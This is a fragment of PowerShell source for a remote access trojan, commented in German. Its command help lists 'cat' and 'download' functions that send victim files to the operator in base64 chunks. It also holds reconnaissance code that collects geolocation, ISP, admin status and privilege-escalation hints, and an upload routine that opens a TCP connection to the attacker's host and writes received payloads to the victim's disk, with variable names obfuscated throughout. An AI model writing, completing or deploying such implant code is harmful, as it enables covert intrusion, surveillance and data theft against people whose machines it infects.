...
cat | cat <Datei> [<key>] (z.B. cat flag.txt MeinKey) | Liest den Inhalt einer Datei und sendet ihn zeilenweise (Textdateien, temporaer entschlüsselt falls noetig mit Key; Fallback: CurrentKey/test)
download | download <Datei> [<key>] (z.B. download C:\secret.exe MeinKey) | Laedt jede Datei (Text/Binaer) chunked & base64-encodiert herunter (temporaer entschlüsselt falls noetig mit Key; Fallback: CurrentKey/test)
...
"@
                    ...
                    try {
                        ...
                        $geo = $gr.Content | ConvertFrom-Json
                        $vEo += "Land: " + $geo.country + "`n"
                        $vEo += "Region: " + $geo.region + "`n"
                        $vEo += "Stadt: " + $geo.city + "`n"
                        $vEo += "Lat/Lon: " + $geo.loc + "`n"
                        $vEo += "ISP: " + $geo.org + "`n"
                    } catch {
                        $vEo += "Geolocation-Fehler: $_ (Internet benötigt)`n"
                    }
                    ...
                    $vEo += "Aktuelle Privilegien: " + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") + "`n"
                    $vEo += "Unpatched Services: " + (Get-Service | Where-Object { $_.StartType -eq 'Manual' -and $_.Status -eq 'Stopped' } | Select-Object Name | Out-String) + "`n"
                    $vEo += "Schwachstellen (Beispiele): Win32_Product Enum, ACL-Missbrauch auf C:\Windows\System32`n"
                    if ($vVb) { $vEo += "`nVerbose: Privesc-Checks abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_all*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vOt = "Führe alle Recon aus...`n"
                    # Rufe andere Recon-Funktionen auf (hier als separate ifs, um zu vermeiden)
                    # recon_system, recon_user, etc. – für Vollständigkeit, aber gekürzt
                    $vOt += "Vollständige Enum läuft (System, User, Network, Geo, Privesc).`n"
                    if ($vVb) { $vOt += "Verbose: All-Enum abgeschlossen.`n" }
                } elseif ($vCm -like "upload *") {
                    $vTp = $vCm.Substring(7).Trim()
                    if ([string]::IsNullOrWhiteSpace($vTp)) { $vOt = "Verwendung: upload <Zielpfad>" }
                    else {
                        try {
                            $vTp = (Resolve-Path $vTp -ErrorAction Stop).Path
                            $vDc = New-Object System.Net.Sockets.TCPClient($vUh, $vUp)
                            $vDs = $vDc.GetStream()
                            $vDw = New-Object System.IO.StreamWriter($vDs)
                            $vDr = New-Object System.IO.StreamReader($vDs)
                            $vDw.AutoFlush = $true
                            $vDw.WriteLine("BEGIN_UPLOAD")
                            $vDr.ReadLine()  # Warte auf "READY"
                            $vDw.WriteLine($vTp)
                            $vLn = $vDr.ReadLine()
                            if ($vLn -eq "FILE_NOT_FOUND") { $vOt = "Datei nicht gefunden auf Attacker-Seite."; $vDw.Close(); $vDs.Close(); $vDc.Close(); continue }
                            $vRp = Join-Path -Path $env:TEMP -ChildPath ([System.IO.Path]::GetRandomFileName() + ".tmp")
                            $vFs = [System.IO.File]::Create($vRp)
                            while ($vLn = $vDr.ReadLine()) {
                                if ($vLn -eq "END_UPLOAD") { break }
                                if ($vLn.StartsWith("BEGIN_CHUNK")) {
                                    $vBd = [System.Convert]::FromBase64String($vDr.ReadLine())
                                    $vFs.Write($vBd, 0, $vBd.Length)
                                } elseif ($vLn -eq "END_CHUNK") { }
                            }
                            $vFs.Close()
                            $vIc = [System.IO.Path]::GetExtension($vTp) -eq ".ps1" -and $vTp.StartsWith($vHd)
                            if ($vIc) {
                            ...
                            FnRe3 -tp $vRp -oep $vTp
                            $vOt = "Upload abgeschlossen: $vTp"
                        } catch {
                            $vOt = "Upload-Fehler: $_"
                        }
                    }
